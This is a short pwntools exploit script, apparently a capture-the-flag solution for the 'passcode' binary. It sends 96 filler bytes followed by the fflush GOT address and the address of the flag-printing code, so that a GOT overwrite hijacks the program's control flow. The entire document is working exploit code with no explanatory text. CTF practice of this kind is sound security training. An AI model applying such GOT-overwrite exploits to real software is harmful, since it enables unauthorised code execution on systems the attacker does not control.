#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

TARGET = ELF("./passcode")

processHandle = process(executable=TARGET.path, argv=[TARGET.path])

fflush_got_plt = 0x804a004
flag = 0x080485d7 

payload = "a"*96
payload += p32(fflush_got_plt)
payload += str(int(flag))

print(processHandle.recvline(1024, timeout=1.0))
processHandle.sendline(payload)

print(processHandle.recvline(1024, timeout=1.0))
